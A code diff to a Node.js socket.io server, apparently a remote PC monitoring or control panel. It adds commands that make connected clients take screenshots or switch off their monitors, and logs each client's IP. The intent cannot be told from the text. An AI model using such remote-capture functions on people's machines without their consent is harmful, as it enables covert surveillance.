@@ -13,8 +13,8 @@ var sockets = [];
 var counter = 0;
 
 io.on('connection', function(socket) {
-    var clientIp = socket.request.connection.remoteAddress;
-    console.log("Connection from " + clientIp);
+    //var clientIp = socket.request.connection.remoteAddress;
+    //console.log("Connection from " + clientIp);
     sockets[counter++] = socket;
     //For the Panel
 
@@ -53,6 +53,19 @@ io.on('connection', function(socket) {
         socket.disconnect();
     });
 
+    socket.on('take_screenshot', function(data) {
+        
+        io.sockets.emit("client_take_screenshot", data.pcusername);
+        //clientList[data].
+        socket.disconnect();
+    });
+
+    socket.on('monitor_off', function(data) {
+        
+        io.sockets.emit("client_monitor_off", data.pcusername);
+        //clientList[data].
+        socket.disconnect();
+    });
 
     //Clients
     setInterval(function() {
@@ -86,8 +99,8 @@ io.on('connection', function(socket) {
     
     
     socket.on('ident', function(data) {
-        console.log("Online " + data);
-        clientList[socket] = { id: data, du: 0, mu: 0, nu: 0, cu:0, pr:0, enu: 0};
+        console.log("Online " + data.ident + " from " + data.ip);
+        clientList[socket] = { id: data.ident, ip: data.ip, du: 0, mu: 0, nu: 0, cu:0, pr:0, enu: 0};
     });
 
     
